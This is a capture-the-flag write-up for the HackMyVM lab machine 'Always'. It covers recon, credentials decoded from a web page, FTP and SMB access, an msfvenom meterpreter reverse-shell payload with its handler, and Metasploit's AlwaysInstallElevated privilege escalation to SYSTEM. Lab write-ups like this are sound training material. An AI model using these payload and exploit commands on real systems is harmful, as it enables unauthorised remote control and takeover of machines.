# Always

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.79:21
Open 10.0.2.79:135
Open 10.0.2.79:139
Open 10.0.2.79:445
Open 10.0.2.79:3389
Open 10.0.2.79:5357
Open 10.0.2.79:8080
Open 10.0.2.79:49152
Open 10.0.2.79:49153
Open 10.0.2.79:49154
Open 10.0.2.79:49155
Open 10.0.2.79:49156
Open 10.0.2.79:49157
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.79
PORT      STATE SERVICE       REASON  VERSION
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Service
|_ssl-date: 2025-10-09T16:26:32+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Always-PC
| Issuer: commonName=Always-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-10-08T16:21:50
| Not valid after:  2026-04-09T16:21:50
| MD5:   1ae4:acb6:7001:3f2e:706f:5142:b19e:d6a7
| SHA-1: 0ff3:e4f2:db13:19a6:eff2:a494:c02b:b721:a468:daed
| -----BEGIN CERTIFICATE-----
| MIIC1jCCAb6gAwIBAgIQb0TEt4TCFpdPrDUPtFRcSjANBgkqhkiG9w0BAQUFADAU
| MRIwEAYDVQQDEwlBbHdheXMtUEMwHhcNMjUxMDA4MTYyMTUwWhcNMjYwNDA5MTYy
| MTUwWjAUMRIwEAYDVQQDEwlBbHdheXMtUEMwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQDMSQ8YWyocFuAu+epUbWfQ+FL3Q5UUbWc2DjEn6YCXtJSvuyL3
| GBO20d7pJp5U5XvVMrOCc6uT6xhb5rjxz27cAVK1Y5uN2oZRivFUkpWy34DFWxtG
| 074lskFmDSogGpAzlqBLyLQwabHpEHN0Bn9vX8izp/H/g35urELnSQLjQ3HYJ0Yk
| WdznUpiTmjUdUCDH6qT/6blBn0oJtgUAzYGXzr+qyVLHRz1HK897ZSBh+rUE+QM0
| 57k+MklOnUw8iam7xyhGASlCg/praa43g4VftgOsB0Z4wZvwsxLwoIDvFS00Maq8
| es9mEml6CEHirIwZavXF9OlQH0GDI42d53MzAgMBAAGjJDAiMBMGA1UdJQQMMAoG
| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAuVkEK1iW
| fkLv9Tfp/6Rpqr1tvkeHEE4PekR5catvdE84/NYgupWANOKk555FqymXdOwZRIBJ
| oavuoZdCQ03SfrPDeuiJvGTFqPm+eCqqMZlBO+CD0Jw5gpLQndvztojfGzQGMfa0
| XvyG8Bt4i+hzzWzfKhtx8s4Uc6sJh/ePiuPnoTblzMJLHMHgmAbGTb6P4PgTXOpz
| eFG0PlPMoU2Tge/z5fvDBfgam/peQGQjcGhS1BnjsUJiB9t+zXnEOmHhgn2T4/k/
| cH88shaRad8uT1v17LsIrMDCA74jcosyORHouF8cmnwaDFfN5UK4SIkRPO5ullLK
| s6U76GWEOhwI8Q==
|_-----END CERTIFICATE-----
5357/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8080/tcp  open  http          syn-ack Apache httpd 2.4.57 ((Win64))
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: We Are Sorry
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.57 (Win64)
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49156/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: ALWAYS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Always-PC
|   NetBIOS computer name: ALWAYS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-09T19:26:27+03:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: -45m00s, deviation: 1h29m59s, median: -1s
| smb2-time: 
|   date: 2025-10-09T16:26:27
|_  start_date: 2025-10-09T16:21:48
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21278/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 36189/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41612/udp): CLEAN (Timeout)
|   Check 4 (port 33742/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ALWAYS-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:75:4d:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   ALWAYS-PC<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   ALWAYS-PC<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   08:00:27:75:4d:39:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
```
:::

## HTTP (8080)

![writeup.png](/assets/pentest/hackmyvm/always/writeup.png)

```bash
â””â”€$ feroxbuster -u http://always.hmv:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 199
200      GET        8l       20w      178c http://always.hmv:8080/
301      GET        7l       20w      237c http://always.hmv:8080/ADMIN => http://always.hmv:8080/ADMIN/
301      GET        7l       20w      237c http://always.hmv:8080/Admin => http://always.hmv:8080/Admin/
301      GET        7l       20w      237c http://always.hmv:8080/admin => http://always.hmv:8080/admin/
200      GET        8l       20w      178c http://always.hmv:8080/index.html
```

Client side login credentials, very nice.

![writeup-1.png](/assets/pentest/hackmyvm/always/writeup-1.png)

![writeup-2.png](/assets/pentest/hackmyvm/always/writeup-2.png)

```bash
â””â”€$ echo 'ZnRwdXNlcjpLZWVwR29pbmdCcm8hISE=' | base64 -d
ftpuser:KeepGoingBro!!!
```

> Creds: `ftpuser:KeepGoingBro!!!`

## FTP

```bash
â””â”€$ sshpass -p 'KeepGoingBro!!!' ftp ftpuser@10.0.2.79
Connected to 10.0.2.79.
220 Microsoft FTP Service
331 Password required for ftpuser.
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
10-01-24  08:17PM                   56 robots.txt
ftp> get robots.txt

â””â”€$ cat robots.txt
User-agent: *
Disallow: /admins-secret-pagexxx.html
```

![writeup-3.png](/assets/pentest/hackmyvm/always/writeup-3.png)

Password doesn't work
```bash
â””â”€$ netexec smb 10.0.2.79 -u 'always' -p 'WW91Q2FudEZpbmRNZS4hLiE='
SMB         10.0.2.79       445    ALWAYS-PC        [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)
SMB         10.0.2.79       445    ALWAYS-PC        [-] Always-PC\always:WW91Q2FudEZpbmRNZS4hLiE= STATUS_LOGON_FAILURE

â””â”€$ netexec smb 10.0.2.79 -u 'always' -p 'YouCantFindMe.!.!'
SMB         10.0.2.79       445    ALWAYS-PC        [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)
SMB         10.0.2.79       445    ALWAYS-PC        [-] Always-PC\always:YouCantFindMe.!.! STATUS_LOGON_FAILURE
```

## SMB

We can login as FTP user
```bash
â””â”€$ netexec smb 10.0.2.79 -u 'ftpuser' -p 'KeepGoingBro!!!' --shares
SMB         10.0.2.79       445    ALWAYS-PC        [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:ALWAYS-PC) (domain:Always-PC) (signing:False) (SMBv1:True)
SMB         10.0.2.79       445    ALWAYS-PC        [+] Always-PC\ftpuser:KeepGoingBro!!!
SMB         10.0.2.79       445    ALWAYS-PC        [*] Enumerated shares
SMB         10.0.2.79       445    ALWAYS-PC        Share           Permissions     Remark
SMB         10.0.2.79       445    ALWAYS-PC        -----           -----------     ------
SMB         10.0.2.79       445    ALWAYS-PC        ADMIN$                          Uzak YÃ¶netici
SMB         10.0.2.79       445    ALWAYS-PC        C$                              VarsayÄ±lan deÄŸer
SMB         10.0.2.79       445    ALWAYS-PC        IPC$                            Uzak IPC
```

No code execution ability, not able to winrm or RDP...

After many tries I gave up and looked up pivot ways in writeups and I was surprised to see that somewhat intended way is to login into machine yourself and trigger payload from there. Very unusual case for CTF, but let's say you phished user..

## Reverse Shell (ftpuser)

```bash
â””â”€$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe -o rev.exe
â””â”€$ py -m http.server 80
```

```bash
â””â”€$ msfconsole -q
[*] Starting persistent handler(s)...
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST eth0
LHOST => eth0
msf exploit(multi/handler) > run
```

Translated with Google Translate ðŸ˜³

![writeup-4.png](/assets/pentest/hackmyvm/always/writeup-4.png)

```bash
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.0.2.15:4444
[*] Sending stage (203846 bytes) to 10.0.2.79
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.79:49178) at 2025-10-09 13:00:49 -0400

meterpreter > getuid
Server username: Always-PC\ftpuser
```

Auto get system failed
```bash
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: 1726 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```

## Privilege Escalation

```bash
meterpreter > bg
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf post(multi/recon/local_exploit_suggester) > run
...
 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 6   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
 8   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/ms15_078_atmfd_bof                       Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/virtual_box_opengl_escape                Yes                      The service is running, but could not be validated.
 ...
```

[Windows AlwaysInstallElevated MSI](https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated)

```bash
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/always_install_elevated) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/always_install_elevated) > set SESSION 1
SESSION => 1
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Flags

```bash
C:\Windows\system32> dir C:\Users\*user.txt /s /b
C:\Users\Always\Desktop\user.txt

C:\Windows\system32>type \Users\Always\Desktop\user.txt
HMV{You_Found_Me!}

C:\Windows\system32>dir C:\Users\*root.txt /s /b
C:\Users\Administrator\Desktop\root.txt

C:\Windows\system32>type \Users\Administrator\Desktop\root.txt
HMV{White_Flag_Raised}
```
